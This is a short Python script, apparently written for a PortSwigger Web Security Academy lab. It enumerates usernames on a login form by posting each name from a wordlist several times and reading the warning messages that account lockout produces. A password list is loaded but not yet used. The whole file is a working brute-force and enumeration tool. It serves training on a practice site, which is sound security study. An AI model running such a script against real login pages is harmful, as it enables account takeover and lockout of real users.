import requests
from bs4 import BeautifulSoup

lab_url = 'https://0a2e001704a7b31d80c6b22600c9000b.web-security-academy.net/login'


def readFile(fileName):
    with open(fileName, "r", encoding="utf-8") as file:
        return file.read().splitlines()

def extractErrorMessage(html):
    soup = BeautifulSoup(html, "html.parser")
    return soup.select_one('.is-warning')

usernames = readFile("usernames.txt")
passwords = readFile("passwords.txt")

for username in usernames:
    data = {'username': username, 'password': 'password'}
    for i in range(1,5):
        response = requests.post(url=lab_url, data=data)
        err = extractErrorMessage(response.text)
        print(f"{err.get_text(strip=True)} username: {username}")
            

